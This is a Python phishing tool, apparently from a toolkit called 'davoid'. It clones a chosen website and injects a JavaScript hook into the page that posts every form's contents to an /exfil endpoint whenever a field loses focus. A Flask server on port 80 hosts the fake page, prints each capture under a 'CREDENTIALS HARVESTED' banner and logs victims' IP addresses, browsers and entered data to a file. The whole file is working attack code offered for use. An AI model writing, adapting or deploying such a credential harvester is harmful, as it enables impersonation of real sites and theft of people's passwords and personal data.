import os
import threading
import logging
import sys
from flask import Flask, request, jsonify
from pywebcopy import save_webpage
from rich.console import Console
from rich.panel import Panel

# Suppress Flask/Werkzeug logs for a cleaner terminal UI
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

console = Console()
app = Flask(__name__)

# Constants
BASE_CLONE_PATH = "/opt/davoid/clones"

@app.route('/exfil', methods=['POST'])
def exfil():
    """
    Endpoint for data exfiltration. 
    Handles incoming form data and logs it to a file.
    """
    try:
        # Capture all form data and client metadata
        data = request.form.to_dict()
        client_ip = request.remote_addr
        user_agent = request.headers.get('User-Agent')

        console.print(Panel(
            f"[bold red]CREDENTIALS HARVESTED[/bold red]\n"
            f"[yellow]IP:[/yellow] {client_ip}\n"
            f"[yellow]Data:[/yellow] {data}",
            title="Exfiltration Event",
            border_style="red"
        ))

        if not os.path.exists("logs"):
            os.makedirs("logs")

        with open("logs/harvested.txt", "a") as f:
            f.write(f"--- Event: {client_ip} ---\n")
            f.write(f"UA: {user_agent}\n")
            f.write(f"Payload: {data}\n\n")

        return "Success", 200
    except Exception as e:
        console.print(f"[red]Exfil Error: {e}[/red]")
        return "Error", 500

def run_server(path):
    """Starts the Flask server to host the cloned site and capture data."""
    try:
        # Flask's built-in server is fine for this use case, 
        # but debug=False is critical for production stability.
        app.run(host='0.0.0.0', port=80, debug=False, threaded=True)
    except Exception as e:
        console.print(f"[bold red][!] Server Failure: {e}[/bold red]")

def clone_site():
    """Logic for cloning a target site and injecting the harvester hook."""
    if os.getuid() != 0:
        return console.print("[red][!] Root required to host on port 80.[/red]")

    console.print("[bold cyan]Site Cloner & Harvester[/bold cyan]")
    
    target_url = console.input("[bold yellow]Target URL to Clone (e.g. https://example.com): [/bold yellow]").strip()
    project = console.input("[bold yellow]Project Name: [/bold yellow]").strip()

    if not os.path.exists(BASE_CLONE_PATH):
        os.makedirs(BASE_CLONE_PATH)

    console.print(f"[*] Cloning {target_url}...")
    try:
        save_webpage(
            url=target_url, 
            project_folder=BASE_CLONE_PATH,
            project_name=project, 
            bypass_robots=True,
            debug=False
        )
    except Exception as e:
        return console.print(f"[red]Cloning failed: {e}[/red]")

    # Advanced Injected Hook: 
    # Listens for 'input' events (real-time) and sends data to /exfil
    hook = """
    <script>
    document.querySelectorAll('input').forEach(input => {
        input.addEventListener('blur', () => {
            const forms = document.querySelectorAll('form');
            forms.forEach(form => {
                const formData = new FormData(form);
                if (formData.values().next().value) { // Only send if not empty
                    fetch('/exfil', {
                        method: 'POST',
                        body: formData
                    });
                }
            });
        });
    });
    </script>
    """

    # Injecting the hook into index.html
    found_index = False
    for root, _, files in os.walk(os.path.join(BASE_CLONE_PATH, project)):
        if "index.html" in files:
            index_path = os.path.join(root, "index.html")
            with open(index_path, "r", encoding="utf-8") as f:
                content = f.read()
            
            # Inject before closing body tag for better compatibility
            if "</body>" in content:
                content = content.replace("</body>", f"{hook}</body>")
            else:
                content += hook
                
            with open(index_path, "w", encoding="utf-8") as f:
                f.write(content)
            
            project_path = root
            found_index = True
            break

    if not found_index:
        return console.print("[red][!] Could not locate index.html in the cloned project.[/red]")

    console.print("[green][+] Hook injected into index.html[/green]")

    if console.input("\n[bold cyan]Start Harvest Server? (y/N): [/bold cyan]").lower() == 'y':
        os.chdir(project_path)
        server_thread = threading.Thread(target=run_server, args=(project_path,), daemon=True)
        server_thread.start()
        
        console.print(f"[bold green][+] Portal active at http://[YOUR_IP]/[/bold green]")
        console.print("[dim]Monitor logs/harvested.txt for real-time capture.[/dim]")
        
        try:
            while True:
                # Keep main thread alive
                pass
        except KeyboardInterrupt:
            console.print("\n[yellow][-] Shutting down harvester.[/yellow]")

if __name__ == "__main__":
    clone_site()